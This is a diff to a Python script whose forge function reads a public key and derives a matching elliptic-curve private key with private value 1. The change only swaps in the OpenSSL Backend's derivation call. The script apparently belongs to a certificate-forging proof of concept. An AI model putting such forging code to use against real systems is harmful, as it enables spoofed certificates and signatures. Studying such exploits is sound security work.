@@ -10,6 +10,7 @@ from cryptography import x509
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.backends.openssl.ec import _EllipticCurvePublicKey
+from cryptography.hazmat.backends.openssl.backend import Backend
 from cryptography.hazmat.primitives.asymmetric.ec import derive_private_key
 from cryptography.hazmat.primitives.serialization import Encoding
 from cryptography.hazmat.primitives.serialization import PublicFormat
@@ -33,10 +34,10 @@ def forge(path: str):
     # TODO: Remove prints
     print("Found public key")
     print(public_key.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo))
-
+    backend = Backend()
     curve = public_key.curve
     private_value = 1
-    private_key = derive_private_key(private_value, curve, default_backend())
+    private_key = backend.derive_elliptic_curve_private_key(private_value, curve)
 
     pem = private_key.private_bytes(
         encoding=serialization.Encoding.PEM,
